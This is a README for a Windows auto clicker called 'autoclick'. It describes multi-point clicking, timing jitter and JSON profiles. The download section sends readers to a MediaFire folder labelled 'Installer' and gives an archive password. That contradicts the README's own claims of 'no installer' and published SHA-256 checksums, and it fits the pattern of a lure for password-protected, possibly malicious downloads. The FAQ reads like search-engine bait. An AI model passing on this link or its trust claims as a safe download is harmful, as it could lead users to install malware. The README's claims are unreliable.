# autoclick

👆 Free, open-source auto clicker for Windows — configurable click points, intervals and human-like jitter. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Multi-point clicking** — up to 20 click targets with independent delays and repeat counts
- ✅ **Millisecond precision** — intervals from 10 ms, with standard deviation jitter to avoid robotic uniformity
- ✅ **Hold and drag support** — press-duration control and simple drag paths for repetitive UI work
- ✅ **Global start/stop hotkey** — F6 starts and stops from any app without stealing focus
- ✅ **Randomized coordinates** — optional ±N pixel scatter for game menus and test harnesses
- ✅ **Profile saving** — named configs per task, exported as plain JSON for teammates
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why autoclick

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **autoclick** | GS Auto Clicker | OP Auto Clicker | AutoClicker (OSS) |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Free | Free, OSS |
| Open source | **Yes** | No | No | Yes |
| Multi-point sequences | **20 points** | 1 point | 1 point | 1 point |
| Millisecond jitter control | **Yes** | No | Partial | No |
| JSON profiles | **Yes** | No | No | No |
| Portable, no install | **Yes, 100 MB** | Zip | Zip | Build from source |

## FAQ

**how to make an auto clicker on Windows for free?**

Most free clickers are single-point executables with opaque origins and no jitter, which triggers idle detection in games and UIs. autoclick is open source, supports twenty independently scheduled points, and its JSON profiles make automation auditable. It is a 100 MB portable exe under MIT, offline, with no ads and no telemetry.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark click grid (#121418, cyan #22D3EE): canvas with three numbered click points and delay labels, interval field 250 ms, variance 15 percent.
2. Sequence editor: per-point repeat counts, hold duration column, drag-path preview line linking points two and three.
3. Profiles and hotkeys: named profile list (Menus, Forms, Tests), F6 start stop recorder, JSON export button, run log tail.

## Download

| Source | Link |
|---|---|
| 💾 **Installer autoclick** | [Installer autoclick](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).